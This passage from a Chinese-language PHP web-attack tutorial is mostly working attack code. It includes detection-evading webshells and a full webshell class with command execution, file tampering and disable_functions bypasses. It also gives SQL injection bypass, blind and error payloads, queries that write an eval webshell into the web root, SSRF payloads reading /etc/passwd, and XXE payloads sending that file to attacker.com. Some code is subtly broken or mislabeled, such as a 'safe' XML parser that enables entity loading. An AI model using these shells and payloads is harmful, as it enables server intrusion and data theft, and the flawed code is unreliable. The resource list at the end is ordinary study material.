
---

## 四、高级实战案例

### 4.1 高级 WebShell 与免杀

编写功能更强大的 PHP WebShell 和绕过检测的技巧。

```php
<?php
// ===== 免杀 WebShell =====
// 技巧1: 字符串拼接 + base64 编码
$a = "base" . "64_de" . "code";
$b = "asse" . "rt";
$c = @$_POST['x'];
if ($c) {
    $b($a($c));  // assert(base64_decode($_POST['x']))
}

// 技巧2: 回调函数
$func = create_function('', @$_POST['code']);
$func();

// 技巧3: 数组回调
$arr = array('', '');
$arr[0]($_POST['cmd']);  // 比如 $arr[0] = 'assert'

// 技巧4: 类的魔法方法
class Shell {
    public function __destruct() {
        assert($this->cmd);
    }
}
$sh = new Shell();
$sh->cmd = @$_POST['x'];

// ===== 高级 WebShell 功能 =====
class AdvancedShell {
    private $password = 'your_password_here';
    
    public function __construct() {
        if ($_POST['pass'] !== $this->password) {
            die('Access denied');
        }
    }
    
    // 命令执行
    public function exec($cmd) {
        $methods = ['exec', 'shell_exec', 'system', 'passthru', 'popen'];
        foreach ($methods as $m) {
            if (function_exists($m)) {
                if ($m === 'popen') {
                    $handle = popen($cmd, 'r');
                    $result = '';
                    while (!feof($handle)) {
                        $result .= fgets($handle, 1024);
                    }
                    pclose($handle);
                    return $result;
                }
                return $m($cmd);
            }
        }
        return 'No exec function available';
    }
    
    // 文件管理
    public function fileManager($action, $path, $content = '') {
        switch ($action) {
            case 'read':
                return file_get_contents($path);
            case 'write':
                return file_put_contents($path, $content);
            case 'list':
                return scandir($path);
            case 'delete':
                return unlink($path);
            default:
                return 'Unknown action';
        }
    }
    
    // 数据库操作
    public function dbQuery($host, $user, $pass, $db, $sql) {
        $mysqli = new mysqli($host, $user, $pass, $db);
        if ($mysqli->connect_error) {
            return 'Connect failed: ' . $mysqli->connect_error;
        }
        $result = $mysqli->query($sql);
        if (is_bool($result)) {
            return $result ? 'Success' : 'Error: ' . $mysqli->error;
        }
        $rows = [];
        while ($row = $result->fetch_assoc()) {
            $rows[] = $row;
        }
        return $rows;
    }
    
    // 提权信息收集
    public function info() {
        return [
            'os' => PHP_OS,
            'php_version' => phpversion(),
            'server_software' => $_SERVER['SERVER_SOFTWARE'],
            'disable_functions' => ini_get('disable_functions'),
            'open_basedir' => ini_get('open_basedir'),
            'safe_mode' => ini_get('safe_mode'),
            'current_user' => get_current_user(),
            'uid' => getmyuid(),
            'gid' => getmygid(),
        ];
    }
    
    // 绕过 disable_functions 的尝试
    public function bypassDF($cmd) {
        // 方法1: pcntl_exec
        if (function_exists('pcntl_exec')) {
            pcntl_exec('/bin/sh', ['-c', $cmd]);
        }
        
        // 方法2: 利用 LD_PRELOAD
        if (function_exists('putenv') && function_exists('mail')) {
            // 需要配合恶意 .so 文件
        }
        
        // 方法3: COM 对象 (Windows)
        if (class_exists('COM')) {
            $shell = new COM('WScript.Shell');
            $shell->Run($cmd);
        }
        
        return 'Bypass attempt completed';
    }
}
?>
```

### 4.2 SQL 注入绕过与高级利用

SQL 注入的高级绕过技巧和数据提取方法。

```php
<?php
// ===== SQL 注入绕过技巧 =====

// 1. 绕过空格过滤
// 用注释替代空格: /*!*/ 或 %09, %0a, %0b, %0c, %0d, %a0
$payload1 = "id=1/**/UNION/**/SELECT/**/1,2,3";

// 2. 绕过引号过滤
// 十六进制字符串
$payload2 = "id=1 AND name=0x61646d696e";  // admin 的十六进制
// char 函数
$payload3 = "id=1 AND name=char(97,100,109,105,110)";

// 3. 绕过等号过滤
// 使用 LIKE 或 IN
$payload4 = "id=1 AND 1 LIKE 1";
$payload5 = "id=1 AND 1 IN (1)";
// 使用 REGEXP
$payload6 = "id=1 AND 'test' REGEXP '^t'";

// 4. 绕过 UNION 过滤
// 大小写混淆
$payload7 = "id=1 uNiOn SeLeCt 1,2,3";
// 内联注释（MySQL 特性）
$payload8 = "id=1 /*!UNION*/ /*!SELECT*/ 1,2,3";

// 5. 绕过关键字过滤
// 双写绕过 (如果过滤一次)
$payload9 = "id=1 UNIUNIONON SELSELECTECT 1,2,3";
// 编码绕过
$payload10 = "id=1 AND 1=1";  // URL 编码后

// ===== 盲注技术 =====

// 基于布尔的盲注
function booleanBasedBlind($url, $param, $charPosition, $asciiValue) {
    $payload = "?{$param}=1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{$charPosition},1))={$asciiValue}--+";
    // 请求页面，根据返回内容判断真假
    return true; // 或 false
}

// 基于时间的盲注
function timeBasedBlind($url, $param, $charPosition, $asciiValue) {
    $payload = "?{$param}=1' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{$charPosition},1))={$asciiValue},SLEEP(5),0)--+";
    // 测量响应时间，如果大于5秒则条件成立
    return true;
}

// 报错注入
function errorBasedInjection($url, $param) {
    // MySQL: updatexml, extractvalue, floor+rand+group by
    $payloads = [
        "?{$param}=1' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--+",
        "?{$param}=1' AND extractvalue(1,concat(0x7e,(SELECT version())))--+",
        "?{$param}=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+",
    ];
    return $payloads;
}

// ===== 数据提取 =====

// MySQL 常用查询
$queries = [
    'version' => 'SELECT version()',
    'database' => 'SELECT database()',
    'user' => 'SELECT user()',
    'tables' => 'SELECT table_name FROM information_schema.tables WHERE table_schema=database()',
    'columns' => 'SELECT column_name FROM information_schema.columns WHERE table_name=0x7573657273',  // users
    'data' => 'SELECT username,0x3a,password FROM users',
];

// 写文件
$outfile = "SELECT '<?php eval(\$_POST[1])?>' INTO OUTFILE '/var/www/html/shell.php'";
$dumpfile = "SELECT '<?php eval(\$_POST[1])?>' INTO DUMPFILE '/tmp/shell.php'";
$logfile = "SET GLOBAL general_log = 'ON'; SET GLOBAL general_log_file = '/var/www/html/shell.php'; SELECT '<?php eval(\$_POST[1])?>';";
?>
```

### 4.3 SSRF 与 XXE 攻击

服务器端请求伪造和 XML 外部实体注入的 PHP 利用。

```php
<?php
// ===== SSRF 攻击 =====

// SSRF 常见场景
function ssrf_vulnerable($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

// SSRF 利用方式
$ssrf_payloads = [
    // 探测内网
    'http://127.0.0.1:22/',
    'http://127.0.0.1:6379/',
    'http://192.168.1.1/',
    'http://10.0.0.1:8080/',
    
    // file 协议（读本地文件）
    'file:///etc/passwd',
    'file:///C:/windows/win.ini',
    
    // gopher 协议（攻击内网服务）
    'gopher://127.0.0.1:6379/_INFO',
    
    // dict 协议
    'dict://127.0.0.1:6379/INFO',
    
    // 绕过技巧
    'http://0x7f000001/',       // 十六进制
    'http://2130706433/',       // 十进制
    'http://017700000001/',     // 八进制
    'http://127.1/',            // 简写
    'http://0.0.0.0:22/',       // 0.0.0.0
    'http://localhost:22/',     // localhost
];

// ===== XXE 攻击 =====

function xxe_vulnerable($xmlData) {
    $dom = new DOMDocument();
    $dom->loadXML($xmlData);  // 漏洞点：禁用外部实体
    return $dom;
}

// XXE Payload
$xxe_payload = <<<XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
XML;

// XXE 高级：外部 DTD
$xxe_external = <<<XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
<foo>&xxe;</foo>
XML;

// evil.dtd 内容：
// <!ENTITY % file SYSTEM "file:///etc/passwd">
// <!ENTITY % eval "<!ENTITY xxe SYSTEM 'http://attacker.com/?data=%file;'>">
// %eval;

// Blind XXE（无回显时带外数据）
$blind_xxe = <<<XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
<foo>test</foo>
XML;

// XXE 防护
function safe_xml_parse($xmlData) {
    $dom = new DOMDocument();
    $dom->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD);  // 不安全！
    // 安全的方式：禁用外部实体
    libxml_disable_entity_loader(true);  // PHP 8.0+ 默认禁用
    return $dom;
}
?>
```

---

## 五、进阶学习资源

### 5.1 PHP 安全资源

- **OWASP PHP 安全**：https://cheatsheetseries.owasp.org/cheatsheets/PHP_Security_Cheat_Sheet.html
- **PHP 安全手册**：https://www.php.net/manual/zh/security.php — 官方安全指南
- **PHP 漏洞利用**：https://github.com/1N3/PHP-Exploits — PHP 漏洞利用集合
- **PHP 配置安全**：php.ini 安全配置最佳实践

### 5.2 WebShell 与免杀

- **webshell-manager**：各种 WebShell 管理工具
  - 中国菜刀 / 蚁剑 / 冰蝎 / 哥斯拉
- **WebShell 免杀技术**：
  - 字符串变形与编码
  - 回调函数绕过
  - 类魔法方法
  - 混淆与加密
- **WebShell 检测与查杀**：
  - 特征码扫描
  - 流量分析
  - 行为分析

### 5.3 SQL 注入进阶

- **SQL Injection Cheat Sheet**：https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
- **PortSwigger SQLi**：https://portswigger.net/web-security/sql-injection
- **sqlmap 文档**：https://github.com/sqlmapproject/sqlmap/wiki
- **MySQL 注入技巧**：
  - information_schema 利用
  - 报错注入（updatexml/extractvalue/floor）
  - 盲注（布尔/时间）
  - 文件读写（load_file/infile/outfile/dumpfile）
  - UDF 提权
  - MOF 提权
  - log 写 shell

### 5.4 代码审计

- **PHP 代码审计**：
  - 危险函数定位（eval/assert/system/shell_exec 等）
  - SQL 注入点审计
  - XSS 点审计
  - 文件上传漏洞
  - 变量覆盖（$$/extract/parse_str）
  - 反序列化漏洞
  - SSRF 漏洞

- **审计工具**：
  - RIPS — PHP 静态代码分析
  - Seay 源代码审计系统
  - CodeQL — 代码查询语言
  - SonarQube — 代码质量与安全

### 5.5 PHP 反序列化

- **PHP 反序列化漏洞**：
  - __wakeup / __destruct 魔法方法
  - POP 链（Property Oriented Programming）
  - PHP 原生类利用
  - Phar 反序列化
  - Session 反序列化

- **学习资源**：
  - https://github.com/ambionics/phpggc — PHP 反序列化 POP 链生成工具
  - https://paper.seebug.org/681/ — PHP 反序列化详解

### 5.6 CTF 与练习平台

- **Web 安全**：
  - **Hack The Box**：https://www.hackthebox.com/
  - **TryHackMe**：https://tryhackme.com/
  - **PortSwigger Web Security Academy**：https://portswigger.net/web-security
  - **picoCTF**：https://picoctf.org/

- **国内平台**：
  - **Bugku**：https://ctf.bugku.com/
  - **攻防世界**：https://adworld.xctf.org.cn/
  - **BUUCTF**：https://buuoj.cn/
  - **CTFHub**：https://www.ctfhub.com/

- **SQL 注入练习**：
  - **SQLi Labs**：https://github.com/Audi-1/sqli-labs
  - **bWAPP**：http://www.itsecgames.com/
  - **DVWA**：https://dvwa.co.uk/
  - **WebGoat**：https://owasp.org/www-project-webgoat/

### 5.7 推荐书籍

- **PHP 安全**：
  - 《PHP 安全》
  - 《PHP 安全编程》
  - 《PHP 高级程序设计》

- **Web 安全**：
  - 《Web 安全深度剖析》
  - 《白帽子讲 Web 安全》
  - 《SQL 注入攻击与防御》
  - 《Web 前端黑客技术揭秘》

- **代码审计**：
  - 《代码审计实战》
  - 《Web 代码审计实战》
  - 《PHP 代码审计入门指南》

### 5.8 社区与博客

- **FreeBuf**：https://www.freebuf.com/
- **安全客**：https://www.anquanke.com/
- **先知社区**：https://xz.aliyun.com/
- **Seebug**：https://www.seebug.org/
- **90sec**：https://www.90sec.com/
- **T00ls**：https://www.t00ls.net/

### 5.9 进阶学习路线

**第 1 阶段：PHP 深入（1-2月）**
- 类与对象、命名空间、trait
- 魔法方法详解
- 反射、SPL
- PHP 配置与安全选项

**第 2 阶段：Web 安全基础（2-3月）**
- SQL 注入原理与利用
- XSS/CSRF/文件上传
- 命令注入、代码注入
- SSRF/XXE

**第 3 阶段：高级 PHP 安全（3-4月）**
- 反序列化漏洞与 POP 链
- 变量覆盖漏洞
- PHP 特性绕过
- WebShell 免杀

**第 4 阶段：代码审计（2-3月）**
- 危险函数审计方法
- CMS 漏洞分析
- 框架漏洞研究
- 审计工具使用

**第 5 阶段：实战与 CTF（持续）**
- 参加 Web 方向 CTF
- 研究最新 PHP 漏洞
- 开发安全工具
- 挖掘真实漏洞
